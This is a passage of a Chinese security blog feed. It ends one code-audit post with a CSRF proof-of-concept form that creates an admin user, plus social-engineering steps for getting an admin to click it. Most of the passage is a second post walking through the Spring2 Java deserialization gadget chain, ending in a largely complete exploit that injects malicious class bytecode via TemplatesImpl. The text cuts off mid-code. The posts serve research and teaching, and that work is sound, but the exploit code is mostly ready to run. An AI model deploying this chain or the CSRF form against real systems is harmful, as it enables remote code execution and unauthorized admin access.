class="hljs-string">&#x27;/&#x27;</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;http://10.0.0.67:8080/adminPage/admin/addOver&quot;</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;id&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;&quot;</span> /&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;name&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;test&quot;</span> /&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;api&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;false&quot;</span> /&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;type&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;0&quot;</span> /&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;parentId&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;&quot;</span> /&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;pass&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;e10adc3949ba59abbe56e057f20f883ec7231c2ecd7fa89fd6bae6e81d2adc80&quot;</span> /&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;Submit request&quot;</span> /&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br><br></code></pre></td></tr></table></figure><p>action改为对应的网址，name改为要创建的用户。</p><p>模拟admin用户在线，引导admin用户点击链接</p><p><img src="image-20231123035726533.png" alt="image-20231123035726533"></p><p>点击后成功创建用户</p><p><img src="image-20231123035814882.png" alt="image-20231123035814882"></p><p>成功登陆</p><p><img src="image-20231123040124874.png" alt="image-20231123040124874"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>没办法，鉴权做的太好了，只能通过社工来进入后台，后台有命令执行功能点，没什么好审计rce的点，水几个垃圾洞好了。</p><h2 id="声明"><a href="#声明" class="headerlink" title="声明"></a>声明</h2><p>此文章 仅用于教育目的。请负责任地使用它，并且仅在您有明确测试权限的系统上使用。滥用此 PoC 可能会导致严重后果。</p>]]></content>
    
    
    
    <tags>
      
      <tag>代码审计</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>spring2-gadget</title>
    <link href="/2023/12/14/spring2-gadget/"/>
    <url>/2023/12/14/spring2-gadget/</url>
    
    <content type="html"><![CDATA[<ol><li>依赖版本</li></ol><p>spring-core : 4.1.4.RELEASE<br>spring-aop : 4.1.4.RELEASE<br>jdk 1.7-1.8</p><p>Spring2 在 Spring1 的触发链上有所变换，替换了 spring-beans 的 ObjectFactoryDelegatingInvocationHandler，使用了 spring-aop 的 JdkDynamicAopProxy ，并完成了后续触发 TemplatesImpl 的流程。</p><h2 id="0x01-MethodInvokeTypeProvider"><a href="#0x01-MethodInvokeTypeProvider" class="headerlink" title="0x01 MethodInvokeTypeProvider"></a>0x01 MethodInvokeTypeProvider</h2><p>org.springframework.core.SerializableTypeWrapper$MethodInvokeTypeProvider.java</p><p>接下来我们从反序列触发点开始分析。</p><p>readObject()</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">readObject</span><span class="hljs-params">(ObjectInputStream inputStream)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>inputStream.defaultReadObject();<br><span class="hljs-type">Method</span> <span class="hljs-variable">method</span> <span class="hljs-operator">=</span> ReflectionUtils.findMethod(<span class="hljs-built_in">this</span>.provider.getType().getClass(), <span class="hljs-built_in">this</span>.methodName);<br><span class="hljs-built_in">this</span>.result = ReflectionUtils.invokeMethod(method, <span class="hljs-built_in">this</span>.provider.getType());<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="1700938325145-d7d5aee2-c3cf-4343-b7db-dfa471b73006-20231214002318574.png" alt="img"></p><p>先在class找对应的方法，然后使用这个方法。调用的方法只能是无参方法。很容易就想到TemplatesImpl.newTransformer()。也就是办法把methodName改为newTransformer，provider.getType().getClass()要得到TemplatesI。</p><h2 id="0x02-AnnotationInvocationHandler-java"><a href="#0x02-AnnotationInvocationHandler-java" class="headerlink" title="0x02 AnnotationInvocationHandler.java"></a>0x02 AnnotationInvocationHandler.java</h2><p>sun&#x2F;reflect&#x2F;annotation&#x2F;AnnotationInvocationHandler.java</p><p>通过这个AnnotationInvocationHandler.java 动态代理结合interfaces，然后在反射构造函数传入map，map里面包含interfaces里面的方法名，和一个对象(<strong>map(“方法名”，Object)</strong>)，就可以在invocationHandler.invoke()调用时放回这个<strong>Object，</strong>这就是Spring1这条链的精髓所在<strong>。</strong></p><p><img src="1700937893410-8dbc5a8b-7b81-488e-a7fa-7c4c45914c1e-20231214002318581.png" alt="img"></p><p><img src="1700937914135-815c9d15-7551-4c86-afac-96e1bc946ce9-20231214002318564.png" alt="img"></p><p><img src="1700937934220-d58a68a8-ae74-468a-9559-d6af8b456278-20231214002318579.png" alt="img"></p><p>invoke</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> Object <span class="hljs-title function_">invoke</span><span class="hljs-params">(Object proxy, Method method, Object[] args)</span> &#123;<br>       <span class="hljs-type">String</span> <span class="hljs-variable">member</span> <span class="hljs-operator">=</span> method.getName();<br>       Class&lt;?&gt;[] paramTypes = method.getParameterTypes();<br><br>       <span class="hljs-comment">// Handle Object and Annotation methods</span><br>       <span class="hljs-keyword">if</span> (member.equals(<span class="hljs-string">&quot;equals&quot;</span>) &amp;&amp; paramTypes.length == <span class="hljs-number">1</span> &amp;&amp;<br>           paramTypes[<span class="hljs-number">0</span>] == Object.class)<br>           <span class="hljs-keyword">return</span> equalsImpl(args[<span class="hljs-number">0</span>]);<br>       <span class="hljs-keyword">if</span> (paramTypes.length != <span class="hljs-number">0</span>)<br>           <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AssertionError</span>(<span class="hljs-string">&quot;Too many parameters for an annotation method&quot;</span>);<br><br>       <span class="hljs-keyword">switch</span>(member) &#123;<br>       <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;toString&quot;</span>:<br>           <span class="hljs-keyword">return</span> toStringImpl();<br>       <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;hashCode&quot;</span>:<br>           <span class="hljs-keyword">return</span> hashCodeImpl();<br>       <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;annotationType&quot;</span>:<br>           <span class="hljs-keyword">return</span> type;<br>       &#125;<br><br>       <span class="hljs-comment">// Handle annotation member accessors</span><br>       <span class="hljs-type">Object</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> memberValues.get(member);<br><br>       <span class="hljs-keyword">if</span> (result == <span class="hljs-literal">null</span>)<br>           <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IncompleteAnnotationException</span>(type, member);<br><br>       <span class="hljs-keyword">if</span> (result <span class="hljs-keyword">instanceof</span> ExceptionProxy)<br>           <span class="hljs-keyword">throw</span> ((ExceptionProxy) result).generateException();<br><br>       <span class="hljs-keyword">if</span> (result.getClass().isArray() &amp;&amp; Array.getLength(result) != <span class="hljs-number">0</span>)<br>           result = cloneArray(result);<br><br>       <span class="hljs-keyword">return</span> result;<br>   &#125;<br></code></pre></td></tr></table></figure><h2 id="0x03-TypeProvider"><a href="#0x03-TypeProvider" class="headerlink" title="0x03 TypeProvider"></a>0x03 TypeProvider</h2><p>org.springframework.core.SerializableTypeWrapper$TypeProvider</p><p><img src="1700938736196-62c5cd98-c206-43cb-9c64-00bb1622fd67-20231214002318577.png" alt="img"></p><p>TypeProvider这个接口刚好有这个方法，可以想到通过AnnotationInvocationHandler.invoke来放回TemplatesI。</p><p>那么就是通过动态代理代理TypeProvider接口，invocationHandler传入AnnotationInvocationHandler，然后通过反射调用构造函数传入map(“geType”，TemplatesI)，在调用接口任意方法就能返回TemplatesI。</p><p>对应的实现代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs java">Class&lt;?&gt;       c           = Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>Constructor&lt;?&gt; constructor = c.getDeclaredConstructors()[<span class="hljs-number">0</span>];<br>constructor.setAccessible(<span class="hljs-literal">true</span>);<br><br><br><br><span class="hljs-comment">// 接下来代理  TypeProvider 的 getType() 方法，使其返回我们创建的 typeTemplateProxy 代理类</span><br>HashMap&lt;String, Object&gt; map2 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>map2.put(<span class="hljs-string">&quot;getType&quot;</span>, templates);<br><br><span class="hljs-type">InvocationHandler</span> <span class="hljs-variable">newInvocationHandler</span> <span class="hljs-operator">=</span> (InvocationHandler) constructor.newInstance(Target.class, map2);<br><br>Class&lt;?&gt; typeProviderClass = Class.forName(<span class="hljs-string">&quot;org.springframework.core.SerializableTypeWrapper$TypeProvider&quot;</span>);<br><span class="hljs-comment">// 使用 AnnotationInvocationHandler 动态代理 TypeProvider 的 getType 方法，使其返回 typeTemplateProxy</span><br><span class="hljs-type">Object</span> <span class="hljs-variable">typeProviderProxy</span> <span class="hljs-operator">=</span> Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;typeProviderClass&#125;, newInvocationHandler);<br><br><br><span class="hljs-comment">// 初始化 MethodInvokeTypeProvider</span><br>Class&lt;?&gt;       clazz2 = Class.forName(<span class="hljs-string">&quot;org.springframework.core.SerializableTypeWrapper$MethodInvokeTypeProvider&quot;</span>);<br>Constructor&lt;?&gt; cons   = clazz2.getDeclaredConstructors()[<span class="hljs-number">0</span>];<br>cons.setAccessible(<span class="hljs-literal">true</span>);<br>cons.newInstance(typeProviderProxy,Templates.class.getMethod(<span class="hljs-string">&quot;newTransformer&quot;</span>), <span class="hljs-number">0</span>);<br></code></pre></td></tr></table></figure><p>调试</p><p><img src="1700940037452-042b5e6e-7cd4-45dd-b0bc-320413010234-20231214002318610.png" alt="img"></p><p>可以发现成功返回了TemplatesImpl。</p><p>但是为什么没有加载成功defindclass了。</p><p><img src="1700940133796-e76ec26b-1260-4974-9989-eb495f1ccc93-20231214002318593.png" alt="img"></p><p><strong>这里报错需要一个Type，但是TemplatesImpl cannot be cast to java.lang.reflect.Type，我们需要返回type对象，然后这个继续通过动态代理type对象然后返回TemplatesImpl对象。 这样需要一个InvocationHandler接口的实现类，它的invoke需要满足返回需要去触发另一个动态代理去返回TemplatesImpl对象，然后它需要继承Serializable，最好是jdk原生类，或者Spring里面的类。前辈找到了JdkDynamicAopProxy可以满足这个要求。</strong></p><h2 id="0x04-JdkDynamicAopProxy，AdvisedSupport"><a href="#0x04-JdkDynamicAopProxy，AdvisedSupport" class="headerlink" title="0x04 JdkDynamicAopProxy，AdvisedSupport"></a>0x04 JdkDynamicAopProxy，AdvisedSupport</h2><p><strong>org&#x2F;springframework&#x2F;aop&#x2F;framework&#x2F;AdvisedSupport.java</strong></p><p><img src="1701793454923-2ba3c595-5dc3-4fc5-a779-bd46206ed72f.png" alt="img"></p><p>org&#x2F;springframework&#x2F;aop&#x2F;framework&#x2F;AdvisedSupport.java#setTarget（）</p><p><img src="1701793507324-0e71e207-3f9b-4e7e-9e30-79c75a34baa0.png" alt="img"></p><p>也就是通过setTarget对EMPTY_TARGET_SOURCE赋值，从而对targetSource赋值，</p><p><strong>org&#x2F;springframework&#x2F;aop&#x2F;framework&#x2F;JdkDynamicAopProxy.java#invoke()</strong></p><p><img src="1701793156483-92278a73-dacb-4767-a7e5-429b61b83be9.png" alt="img"></p><p>获取 AdvisedSupport 里的 TargetSource，并调用 getTarget() 方法返回其中的对象</p><p><img src="1701793221615-9a34765e-5e44-4207-bbbe-f0acf846a5d5.png" alt="img"></p><p><img src="1701793246108-24036ed5-15ba-487b-a9b7-f6fd50e12827.png" alt="img">调用 AopUtils#invokeJoinpointUsingReflection() 方法反射调用对象的 method 方法并返回。</p><p>方法里就是简单的反射调用。</p><p><img src="1701793361423-7f344a50-8377-43fb-9b20-e9446532f1e7.png" alt="img"></p><p>在看JdkDynamicAopProxy构造函数。</p><p><img src="1701793751706-5ffc8718-c809-4a5e-865c-87b0d632643a.png" alt="img"></p><p>一切都很巧妙。</p><p><strong>总结起来就是先初始化AdvisedSupport，然后把template对象setTarget进去，然后JdkDynamicAopProxy构造函数赋值advised为AdvisedSupport。这样动态代理JdkDynamicAopProxy时，就能触发targetSource.getTarget()，得到template对象。</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs java">      Class&lt;?&gt; Annotation = Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>      Constructor&lt;?&gt; annotationDeclaredConstructor = Annotation.getDeclaredConstructors()[<span class="hljs-number">0</span>];<br>      annotationDeclaredConstructor.setAccessible(<span class="hljs-literal">true</span>);<br><br><br>      <span class="hljs-type">AdvisedSupport</span> <span class="hljs-variable">advisedSupport</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AdvisedSupport</span>();<br>      advisedSupport.setTarget(templates);<br>      Class&lt;?&gt; Aop = Class.forName(<span class="hljs-string">&quot;org.springframework.aop.framework.JdkDynamicAopProxy&quot;</span>);<br>      Constructor&lt;?&gt; AopConstructor = Aop.getDeclaredConstructors()[<span class="hljs-number">0</span>];<br>      AopConstructor.setAccessible(<span class="hljs-literal">true</span>);<br>      <span class="hljs-type">InvocationHandler</span> <span class="hljs-variable">AopInvocationHandler</span> <span class="hljs-operator">=</span> (InvocationHandler)AopConstructor.newInstance(advisedSupport);<br>      <span class="hljs-comment">// 我们用它代理一个既是 Type 类型又是 Templates(TemplatesImpl 父类) 类型的类</span><br>      <span class="hljs-comment">// 这样这个代理类同时拥有两个类的方法，既能被强转为 TypeProvider.getType() 的返回值，又可以在其中找到 newTransformer 方法        </span><br><span class="hljs-type">Type</span> <span class="hljs-variable">Aopproxy</span> <span class="hljs-operator">=</span> (Type) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Type.class,<br>              Templates.class&#125;, AopInvocationHandler);<br><br>      HashMap&lt;Object, Object&gt; hashMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>      hashMap.put(<span class="hljs-string">&quot;getType&quot;</span>,Aopproxy);<br>      <span class="hljs-type">InvocationHandler</span> <span class="hljs-variable">AnnotationInvocationHandler</span> <span class="hljs-operator">=</span> (InvocationHandler) annotationDeclaredConstructor.newInstance(Target.class, hashMap);<br><br>      Class&lt;?&gt; typeProviderClass = Class.forName(<span class="hljs-string">&quot;org.springframework.core.SerializableTypeWrapper$TypeProvider&quot;</span>);<br>      <span class="hljs-comment">// 使用 AnnotationInvocationHandler 动态代理 TypeProvider 的 getType 方法，使其返回 typeTemplateProxy</span><br>      <span class="hljs-type">Object</span> <span class="hljs-variable">typeProviderProxy</span> <span class="hljs-operator">=</span> Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(),<br>              <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;typeProviderClass&#125;, AnnotationInvocationHandler);<br><br>      Class&lt;?&gt;       clazz2 = Class.forName(<span class="hljs-string">&quot;org.springframework.core.SerializableTypeWrapper$MethodInvokeTypeProvider&quot;</span>);<br>      Constructor&lt;?&gt; MethodIConstructor = clazz2.getDeclaredConstructors()[<span class="hljs-number">0</span>];<br>      MethodIConstructor.setAccessible(<span class="hljs-literal">true</span>);<br><br>      <span class="hljs-type">Object</span> <span class="hljs-variable">objects</span> <span class="hljs-operator">=</span> MethodIConstructor.newInstance(typeProviderProxy,Templates.class.getMethod(<span class="hljs-string">&quot;newTransformer&quot;</span>),<span class="hljs-number">0</span>);<br></code></pre></td></tr></table></figure><p><img src="1701795213210-9ace4276-f84e-42c5-8c80-a4912c68cbad.png" alt="img"></p><p>运行没有问题。</p><p>由于需要反序列化触发。</p><p>所以MethodInvokeTypeProvider初始化时Method随便传一个，然后通过反射修改回newTransfrom。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Object</span> <span class="hljs-variable">objects</span> <span class="hljs-operator">=</span> MethodIConstructor.newInstance(typeProviderProxy,Object.class.getMethod(<span class="hljs-string">&quot;toString&quot;</span>),<span class="hljs-number">0</span>);<br>setFieldValue(objects,<span class="hljs-string">&quot;methodName&quot;</span>,<span class="hljs-string">&quot;newTransformer&quot;</span>);<br></code></pre></td></tr></table></figure><h2 id="0x05-完整利用链"><a href="#0x05-完整利用链" class="headerlink" title="0x05 完整利用链"></a>0x05 完整利用链</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java">SerializableTypeWrapper$MethodInvokeTypeProvider.readObject()<br>    SerializableTypeWrapper.TypeProvider(Proxy).getType()<br>    AnnotationInvocationHandler.invoke()<br>    ReflectionUtils.invokeMethod()<br>    Templates(Proxy).newTransformer()<br>    JdkDynamicAopProxy.invoke()<br>                        AopUtils.invokeJoinpointUsingReflection()<br>    TemplatesImpl.newTransformer()<br></code></pre></td></tr></table></figure><p>完整代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.tmp.cc;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> org.springframework.aop.framework.AdvisedSupport;<br><span class="hljs-keyword">import</span> org.springframework.aop.framework.AopProxy;<br><br><span class="hljs-keyword">import</span> javax.xml.transform.Templates;<br><span class="hljs-keyword">import</span> java.io.ByteArrayInputStream;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.annotation.Target;<br><span class="hljs-keyword">import</span> java.lang.reflect.*;<br><span class="hljs-keyword">import</span> java.nio.file.Files;<br><span class="hljs-keyword">import</span> java.nio.file.Paths;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">spring2</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><br>        <span class="hljs-type">byte</span>[] classBytes = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;EvilCat.class&quot;</span>));<br>        <span class="hljs-type">byte</span>[][] targetByteCodes = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;classBytes&#125;;<br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> TemplatesImpl.class.newInstance();<br>        setFieldValue(templates,<span class="hljs-string">&quot;_bytecodes&quot;</span>,targetByteCodes);<br>        setFieldValue(templates,<span class="hljs-string">&quot;_name&quot;</span>,<span class="hljs-string">&quot;123&quot;</span>);<br>        setFieldValue(templates,<span class="hljs-string">&quot;_class&quot;</span>,<span class="hljs-literal">null</span>);<br>        setFieldValue(templates,<span class="hljs-string">&quot;_tfactory&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br><br>        Class&lt;?&gt; Annotation = Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>        Constructor&lt;?&gt; annotationDeclaredConstructor = Annotation.getDeclaredConstructors()[<span class="hljs-number">0</span>];<br>        annotationDeclaredConstructor.setAccessible(<span class="hljs-literal">true</span>);<br><br><br>        <span class="hljs-type">AdvisedSupport</span> <span class="hljs-variable">advisedSupport</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AdvisedSupport</span>();<br>        advisedSupport.setTarget(templates);<br>        Class&lt;?&gt; Aop = Class.forName(<span class="hljs-string">&quot;org.springframework.aop.framework.JdkDynamicAopProxy&quot;</span>);<br>        Constructor&lt;?&gt; AopConstructor = Aop.getDeclaredConstructors()[<span class="hljs-number">0</span>];<br>        AopConstructor.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">InvocationHandler</span> <span class="hljs-variable">AopInvocationHandler</span> <span class="hljs-operator">=</span> (InvocationHandler)AopConstructor.newInstance(advisedSupport);<br><br>        <span class="hljs-type">Type</span> <span class="hljs-variable">Aopproxy</span> <span class="hljs-operator">=</span> (Type) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Type.class,<br>                Templates.class&#125;, AopInvocationHandler);<br><br>        HashMap&lt;Object, Object&gt; hashMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        hashMap.put(<span class="hljs-string">&quot;getType&quot;</span>,Aopproxy);<br>        <span class="hljs-type">InvocationHandler</span> <span class="hljs-variable">AnnotationInvocationHandler</span> <span class="hljs-operator">=</span> (InvocationHandler) annotationDeclaredConstructor.newInstance(Target.class, hashMap);<br><br>        Class&lt;?&gt; typeProviderClass = Class.forName(<span class="hljs-string">&quot;org.springframework.core.SerializableTypeWrapper$TypeProvider&quot;</span>);<br>        <span class="hljs-comment">// 使用 AnnotationInvocationHandler 动态代理 TypeProvider 的 getType 方法，使其返回 typeTemplateProxy</span><br>        <span class="hljs-type">Object</span> <span class="hljs-variable">typeProviderProxy</span> <span class="hljs-operator">=</span> Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;typeProviderClass&#125;, AnnotationInvocationHandler);<br><br>        Class&lt;?&gt;       clazz2 = Class.forName(<span class="hljs-string">&quot;org.springframework.core.SerializableTypeWrapper$MethodInvokeTypeProvider&quot;</span>);<br>        Constructor&lt;?&gt; MethodIConstructor = clazz2.getDeclaredConstructors()[<span class="hljs-number">0</span>];<br>        MethodIConstructor.setAccessible(<span class="hljs-literal">true</span>);<br><br>        <span class="hljs-type">Object</span> <span class="hljs-variable">objects</span> <span class="hljs-operator">=</span> MethodIConstructor.newInstance(typeProviderProxy,Object.class.getMethod(<span class="hljs-string">&quot;toString&quot;</span>),<span class="hljs-number">0</span>);<br>        setFieldValue(objects,<span class="hljs-string">&quot;methodName&quot;</span>,<span class="hljs-string">&quot;newTransformer&quot;</span>);<br><br>        <span class="hljs-keyword">try</span>&#123;<br>            <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">byteArrayOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>            <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">outputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(byteArrayOutputStream);<br>            outputStream.writeObject(objects);<br>            outputStream.close();<br><br>            <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">inputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(byteArrayOutputStream.toByteArray()));<br>            inputStream.readObject();<br>        &#125;<span class="hljs-keyword">catch</span>(Exception e)&#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br><br><br>    <span class="hljs-keyword">public</span> <span 